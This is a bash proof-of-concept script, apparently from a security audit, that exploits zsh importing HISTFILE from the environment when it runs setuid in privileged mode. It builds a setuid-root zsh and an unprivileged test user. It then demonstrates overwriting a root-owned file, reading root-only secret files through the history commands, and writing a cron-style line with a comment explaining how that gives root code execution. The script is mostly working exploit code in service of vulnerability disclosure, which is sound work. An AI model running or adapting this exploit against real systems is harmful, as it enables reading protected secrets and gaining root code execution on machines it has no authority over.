#!/bin/bash
# Finding 4 PoC: HISTFILE is imported from environment in PRIVILEGED mode,
# allowing an attacker to:
#   1. Read arbitrary files (readhistfile reads from attacker-controlled path)
#   2. Write arbitrary files (savehistfile writes to attacker-controlled path)
#
# The readhistfile() call at init.c:1477 is NOT guarded by unset(PRIVILEGED).
# The savehistfile() call at builtin.c:5873 (zexit path) is also NOT guarded.
# HISTFILE is not a special parameter — no PM_DONTIMPORT_SUID protection.
#
# Must be run as root. Self-cleaning.
set -euo pipefail

ZSH_BIN="${1:-$(command -v zsh 2>/dev/null || echo /bin/zsh)}"
WORK=/tmp/finding4_poc
SUID_ZSH="$WORK/zsh-suid"
VICTIM_HOME="$WORK/victim_home"

cleanup() {
    rm -rf "$WORK"
    id poc_hist_attacker >/dev/null 2>&1 && userdel -rf poc_hist_attacker 2>/dev/null || true
    # Remove any test zshrc we created
    [ -f "$WORK/zshrc.bak" ] && mv "$WORK/zshrc.bak" /etc/zshrc || rm -f /etc/zshrc
}
trap cleanup EXIT

echo "[*] real/effective uid: $(id)"
echo

# === Setup ===
rm -rf "$WORK"
mkdir -p "$WORK" "$VICTIM_HOME"

# Create setuid-root zsh
cp "$ZSH_BIN" "$SUID_ZSH"
chown root:root "$SUID_ZSH"
chmod 4755 "$SUID_ZSH"
echo "[setup] installed setuid-root zsh at $SUID_ZSH:"
ls -la "$SUID_ZSH"

# Create unprivileged test user
id poc_hist_attacker >/dev/null 2>&1 || useradd -m -d "$VICTIM_HOME" -s /bin/bash poc_hist_attacker
chown poc_hist_attacker:poc_hist_attacker "$VICTIM_HOME"
echo "[setup] unprivileged test account: $(id poc_hist_attacker)"

# Empty /etc/zshrc to avoid interference
[ -f /etc/zshrc ] && cp /etc/zshrc "$WORK/zshrc.bak"
echo "# empty" > /etc/zshrc

echo

# === Scenario A: Arbitrary file WRITE via HISTFILE ===
echo "=== SCENARIO A: Arbitrary file write via HISTFILE in PRIVILEGED mode ==="

# Target: write to a root-owned file that the unprivileged user shouldn't be able to modify
TARGET_FILE="$WORK/root_owned_file.txt"
echo "ORIGINAL CONTENT - only root should modify this" > "$TARGET_FILE"
chown root:root "$TARGET_FILE"
chmod 644 "$TARGET_FILE"
echo "[setup] target file owned by root:"
ls -la "$TARGET_FILE"

# Attacker sets HISTFILE to the root-owned target, runs setuid zsh,
# types some commands, exits — savehistfile writes to that path as root
su poc_hist_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export HISTFILE='$TARGET_FILE'
    export SAVEHIST=1000 HISTSIZE=1000
    printf 'echo ATTACKER_WAS_HERE_VIA_HISTFILE\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | tail -5 || true
" || true

echo "[result] target file contents after attack:"
cat "$TARGET_FILE"
if grep -q "ATTACKER_WAS_HERE" "$TARGET_FILE" 2>/dev/null; then
    echo "  >>> CONFIRMED: attacker's commands written to root-owned file via HISTFILE"
else
    echo "  (checking if file was modified at all...)"
    echo "  file stat: $(stat -c '%U:%G %a %s bytes' "$TARGET_FILE")"
fi
echo

# === Scenario B: Arbitrary file READ via HISTFILE ===
echo "=== SCENARIO B: Arbitrary file read via HISTFILE in PRIVILEGED mode ==="

# Create a sensitive file only root should read
SECRET_FILE="$WORK/secret_tokens.txt"
cat > "$SECRET_FILE" <<'EOF'
: 1700000000:0;SECRET_API_KEY=sk-live-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
: 1700000001:0;DATABASE_PASSWORD=supersecret123
: 1700000002:0;AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
EOF
chown root:root "$SECRET_FILE"
chmod 600 "$SECRET_FILE"
echo "[setup] secret file (root-only readable, 600 perms):"
ls -la "$SECRET_FILE"

# Verify attacker can't read it normally
su poc_hist_attacker -s /bin/bash -c "cat '$SECRET_FILE' 2>&1" || true

# Attacker sets HISTFILE to the secret file — readhistfile() reads it into
# history, then the attacker can see it via `fc -l` or `history`
LEAK_FILE="$WORK/leaked_secrets.txt"
su poc_hist_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export HISTFILE='$SECRET_FILE'
    export SAVEHIST=1000 HISTSIZE=1000
    printf 'fc -l -1000 > $LEAK_FILE\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | tail -5 || true
" || true

echo "[result] leaked file contents:"
if [ -f "$LEAK_FILE" ]; then
    cat "$LEAK_FILE"
    if grep -q "SECRET_API_KEY\|DATABASE_PASSWORD\|AWS_SECRET" "$LEAK_FILE" 2>/dev/null; then
        echo "  >>> CONFIRMED: attacker read root-only secrets via HISTFILE"
    fi
else
    echo "  (leak file not created — trying alternate approach)"
    # Alternative: the history might be printed directly
    su poc_hist_attacker -s /bin/bash -c "
        export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
        export HISTFILE='$SECRET_FILE'
        export SAVEHIST=1000 HISTSIZE=1000
        printf 'history\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1
    " 2>&1 | tee "$WORK/hist_output.txt" || true
    if grep -q "SECRET_API_KEY\|DATABASE_PASSWORD\|AWS_SECRET" "$WORK/hist_output.txt" 2>/dev/null; then
        echo "  >>> CONFIRMED: attacker read root-only secrets via history output"
    fi
fi
echo

# === Scenario C: Direct proof HISTFILE is imported in PRIVILEGED mode ===
echo "=== SCENARIO C: HISTFILE is imported from environment in PRIVILEGED mode ==="
su poc_hist_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export HISTFILE='/ATTACKER/CONTROLLED/HISTFILE'
    printf 'echo HISTFILE=\$HISTFILE\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | grep 'HISTFILE=' | tail -1 || true
" || true
echo "  (HISTFILE should contain /ATTACKER/CONTROLLED/HISTFILE)"
echo

# === Scenario D: Write to arbitrary path — e.g., cron.d for code execution ===
echo "=== SCENARIO D: Write attacker commands to /etc/cron.d style path ==="
CRON_TARGET="$WORK/attacker_cron_entry"
su poc_hist_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export HISTFILE='$CRON_TARGET'
    export SAVEHIST=1000 HISTSIZE=1000
    printf '* * * * * root /tmp/evil.sh\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | tail -3 || true
" || true

echo "[result] attacker-created file:"
if [ -f "$CRON_TARGET" ]; then
    ls -la "$CRON_TARGET"
    cat "$CRON_TARGET"
    echo "  >>> File created via HISTFILE — if pointed at /etc/cron.d/something, this is RCE"
else
    echo "  (file not created)"
fi
